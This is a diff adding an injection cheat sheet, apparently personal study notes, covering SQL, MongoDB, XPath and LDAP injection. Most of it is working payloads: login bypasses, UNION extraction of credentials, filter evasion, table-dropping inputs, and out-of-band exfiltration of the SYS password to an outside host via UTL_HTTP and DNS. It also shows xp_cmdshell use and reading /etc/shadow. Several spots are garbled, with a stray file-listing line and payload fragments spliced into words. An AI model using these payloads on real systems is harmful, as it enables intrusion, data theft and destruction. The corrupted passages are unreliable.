@@ -1,0 +1,273 @@
+[sql, ldap, xml, ...] injection into interpreted languages
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[sql]
+/////////////////////////////////////////////////////////////////////////////////////////////////
+[*] example : bypass a login
+
+select * from users where username='hola' and password='hola';
+
+admin'--     >>>   select * from users where username='admin'-- ' and password='hola';
+
+-- is a comment sequence
+/////////////////////////////////////////////////////////////////////////////////////////////////
+[*] most applications will return the first entry from the query:
+so, not knowing the administrator username
+
+' OR 1=1--      >>>     select * from users where username='' OR 1=1-- ' and password='hola';
+admin' OR 'a'='a     >>>     select * from users where username='' OR 'a'='a' and password='hola'; < password ignored
+/////////////////////////////////////////////////////////////////////////////////////////////////
+[*] select statements, insert statements, update statements, delete statements
+usually WHERE clause, often ORDER BY clause or the names of tables and columns
+
+INSERT INTO users( username, password, ID, privs) VALUES ('daf', 'secret', 1, 1)
+/////////////////////////////////////////////////////////////////////////////////////////////////
+[*] injecting into example: the user field: foo', 'bar', 9999, 0)-- 
+
+[####] DETECTION
+[*]Injecting into String Data
+>>> detect error messages submitting single quote.
+>>> two single quotes together. If the error disappears it is probably vulnerable.
+>>> concatenator characters to construct string equivalent to benign input.
+If no error, likely to be vulnerable.
+*oracle: '||'FOO
+*ms-sql: '+'FOO
+*mysql: ' 'FOO
+
+% wildcard sql character ==> large number of results on a search field
+try XSS, because user input could be on the JS response
+
+[*] Injecting into Numeric Data (no encapsultion in two single quotes)
+>>> 1+1 is equal to 2 and so on
+>>> if some effect in the returned data, likely vulnerable
+>>> more complicated expressions SQL-specific keywords and syntax: ASCII('A'), ASCII(1) if ' filtered.
+
+URL-encode payload (interference with HTTP): (& %26) (= %3d) ([space] +,%20) (+ %2b)
+/////////////////////////////////////////////////////////////////////////////////////////////////
+
+[###] ATTACKS
+[*]ORDER BY column_name ASC/DESC
+if the column_name is specified by the user it is not necessary to use a single quote(no escaping)
+different from the other cases:
+databases will not accept a UNION,WHERE,OR or AND keyword at that point => -rw-rw-r--    1 2533     2345         1463 Mar 01 02:39 damn.php
+nested query in place of the  parameter
+column_name replaced by:
+    (select 1 where <<condition>> or 1/0=0)
+
+[*] FINGERPRINTING THE DATABASE
+creating strings and inline comments /*!32302 and 1=0*/ if version>3.23.02 >>> false always if not don't execute
+
+[*] UNION: combine two or more selects, quicker way to retrieve information
+example' UNION SELECT username,password,uid FROM users-- (append results to the  first select)
+>>> they must have the same structure: number of columns and data types (same or convertible) in the same order
+>>> need to know table and columns for access.
+[##############]
+if you don't know one datatype you can use a NULL which can be converted to any data type, guided:
+/////////////////////////////////////////////////////////////////////////////////////////////////
+1. number of columns:
+' UNION SELECT NULL--
+' UNION SELECT NULL, NULL--
+...
+until the query is executed.If error messages are trapped, still rows are being added in the row response.
+/////////////////////////////////////////////////////////////////////////////////////////////////
+2.discover columns t'+or+1%3d1--hat have string data type, used to extract arbitrary data.
+' UNION SELECT 'stringtype',NULL,NULL--
+' UNION SELECT NULL,'stringtype',NULL--
+
+oracle databases must have FROM attribute, use globally accessible table DUAL
+version number example:
+' UNION SELECT @@version,NULL,NULL--
+' UNION SELECT banner,NULL,NULL FR~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~OM v$version-- (oracle)
+/////////////////////////////////////////////////////////////////////////////////////////////////
+[*] extracting useful data:
+metadata table information_schema.columns all details of all tables and columns within the database (MS-SQL,MySQL,SQLite,Postgresql,...)
+'%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns--
+
+all_tab_columns or user_tab_columns in ORACLE.
+
+LARGE Databases ==> wildcards ==> SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%PASS%'
+using a single varchar field:
+
+Oracle: SELECT table_name||':'||column_name FROM all_tab_columns
+MS-SQL: SELECT table_name+':'+column_name FROM information_schema.columns
+MySQL: SELECT CONCAT(table_name,':',column_name) from information_schema.columns
+/////////////////////////////////////////////////////////////////////////////////////////////////
+[**] Filters:
+[*] avoiding blocked characters: 
+    constructing strings with built-in functions not quoting: 
+    SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)|| CHR(114)||CHR(99)||CHR(117)||CHR(115)
+    SELECT ename, sal FROM emp WHERE ename=CHAR(109)+CHAR(97)+CHAR(114)+CHAR(99)+CHAR(117)+CHAR(115)
+
+[*] circumventing simple validation: SeLecT, %00SELECT, SELSELECTECT, %53%45%4c%45%43%54(ascii to hex), %2553%2545...(%25 es %)
+[*] using sql comments: spaces===> SELECT/*foo*/username,pass/*foo*/FROM/*foo*/users;keywords===>SEL/*foo*/ECT username,....(mysql)
+[*] defective filters(multistage...)
+
+[*] Second-Order SQL injection:
+registering users and changing passwords...
+
+[*] other
+' shutdown--
+' drop table users--
+' drop table ......--
+
+[*] using numeric fields to retrive string data:
+ASCII(SUBSTRING('Admin',1,1)) >> 'A' in ascii is 65.
+
+[*] Blind Injection. Out-of-band channels: when no results are retrieved, database-dependent
+MS-SQL (2000: OpenRowSet command open a connection to an external database and insert arbitrary data to it):
+insert into openrowset('SQLOLEDB','DRIVER={SQL Server};SERVER=example.com,80;UID=sa;PWD=pass','select * from foo') values (@@version) (80 FW)
+administrador'
+ORACLE:
+>>> UTL_HTTP package : 
+    /employees.asp?EmpNo=666'||UTL_HTTP.request('example.org:80/'||(SELECT%20username%20FROM%20all_users%20WHERE%20ROWNUM%3d1))--
+>>> to receive the username on the url
+    nc -lp 80
+>>> UTL_INADDR when HTTP is restricted (DNS query to external server) : 
+    /employees.asp?EmpNo=666'||UTL_INADDR.GET_HOST_NAME((SELECT%20PASSWORD%20FROM%20DBA_USERS%20WHERE%20NAME%3d'SYS')||'.example.org')
+this results in a DNS query to the nameserver of example.org. containing SYS password.
+UTL_SMTP send emails, large amounts of data
+UTL_TCP open arbitrary TCP SOCKETS to send and receive
+ORACLE 11g? SYS.DBMS_LDAP.INIT((SELECT PASSWORD FROM SYS.USER$ WHERE NAME=â€™SYSâ€™)||â€™.mdsec.netâ€™,80)
+
+[####] MySQL:
+direct the output from a query to a file UNC path to another computer.
+    select * into outfile '\\\\example.org\\share\\output.txt' from users;
+via a SMB share folder anon write access.
+
+[*] Blind Injection with FW. Inference: conditional Responses. Internal Server Errors 500
+    (select 1 where <<condition>> or 1/0=0) ==> error if condition not true
+
+[*] order by example:
+    /search.jsp?department=20&sort=(select%201/0%20from%20dual%20where%20(select%20substr(max(object_name),1,1)%20FROM%20user_objects)=â€™Yâ€™)
+
+
+[*] sqlmap can retrieve every record in the database.
+
+
+[*] More blind injection: time delays
+MS-SQL: if <condition> waitfor delay '0:0:5'
+quicker way to retrieve data ==> bit by bit operations
+
+if (ASCII(SUBSTRING('Admin',1,1)) & (POWER(2,0))) >0 waitfor delay '0:0:5'
+...
+
+[*] MySQL: select if(user() like 'root@%',sleep(5000), 'false')
+processor-intensive action==> benchmark function: (SHA-1,256... hashing) 
+    select if(user() like 'root@%' benchmark(50000,sha1('test')),'false')
+Postgresql sleep is PG_SLEEP
+
+[*] ORACLE: no functions for time delay, but UTL_HTTP to a nonexistent server, timeout:
+SELECT â€˜aâ€™||Utl_Http.request(â€˜http://madeupserver.comâ€™) FROM dual WHERE (SELECT username FROM all_users WHERE username = â€˜DBSNMPâ€™) = â€˜DBSNMPâ€™
+
+
+[###] Elevation and Further
+MS-SQL: xp_cmdshell 'commands'
+xp_regread and xp_regwrite (registry)
+remove default lockdown: sp_configure
+
+[*] ORACLE: multiple escalation vulnerabilities via built-in procedures that execute with DBA privileges.
+UTL_FILE can read and write to the server filesystem (and other UTL packages)
+
+MySQL: FILE_PRIV permissions
+select load_file('/etc/shadow')
+and select ... into outfile
+UDF(user-defined functions) dynamic libraries in specific path.
+
+[*] SQL Exploitation Tools:
+sqlmap -p param -u url
+...
+
+[###] Remediation: placeholders, least privileges needed, disable built-in functions
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[nosql]
+[mongodb]
+Use existing programming languages. JS example bypass a login:
+return this.username == â€˜$usernameâ€™ & this.password == â€˜$passwordâ€™;
+(1)username: ADMIN'// and whatever password.
+(2)username: a' || 1==1 || 'a'=='a
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[xpath]
+example:
+    <addressBook>
+        <address>
+            <firstName>William</firstName>
+            <surname>Gates</surname>
+            <password>MSRocks!</password>
+            <email>billyg@microsoft.com</email>
+            <ccard>5130 8190 3282 3515</ccard>
+        </address>
+        <address...
+    </addressBook>
+//address/email/text() >> all email addresses
+//address[surname/text()='Gates']
+//address[surname/text()=â€™Dawesâ€™ and password/text()=â€™secretâ€™]/ccard/text()
+subvert logic: password input:'or 'a'='a
+(case sensitive, sql is insensitive)
+
+[###] Retrieve information based on different behaviour
+' or //address[surname/text()='Gates' and substring(password/text(),1,1)='M'] and 'a'='a
+can retrieve all the letters from Gates' password one by one
+
+[###] Blind: how to know parent and child nodes
+' or substring(name(parent::*[position()=1]),1,1)='a
+' or substring(name(parent::*[position()=1]),2,1)='d ...
+then you can cycle through child nodes by index positions:
+//address[position()=3]/child:node()[position()=4]/text()
+//address[position()=3]/child:node()[position()=6]/text()
+completeley blind you have to test if there is any response (absence of error):
+â€˜ or substring(//address[position()=1]/child::node()[position()=6]/text(),1,1)= â€˜Mâ€™ and â€˜aâ€™=â€™a
+
+count() and string-length() are useful functions to retrieve number of iterations to be made.
+
+[###] Detection:
+errors:
+'
+'--
+different response:
+â€˜ or â€˜aâ€™=â€™a
+â€˜ and â€˜aâ€™=â€™b
+ or 1=1
+ and 1=2
+
+[###] prevention: ( ) = â€˜ [ ] : , * / and the space blocked
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~       Serundeng Sapi - Web Application Security        ~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+[ldap]
+personal data commonly.
+AD in Windows domains
+OpenLDAP
+intranet web applications
+
+commonly blind, no error messages, and hard-coded
+
+[###] ttacks
+disjunctive queries:(|(query1)(query2)) (wildcard)
+)(department=* 
+conjunctive queries:(&(query1)(query2)) (if more than one filters) 
+*))(&(name=daf
+use null bytes to comment out (truncate) the rest of the search filter: 
+*))%00
+
+[###] detection
+500 internal server error if queries are not well constructed and injectable (wildcards and brackets) * is a wildcard in ldap but not in sql >> large outputs
+cn attribute is always present, good to test:
+)(cn=*
+*))(|(cn=*
+*))%00
+
+[###] prevention:( ) ; , * | & = and the null byte blocked
+
+
+
+
+
+
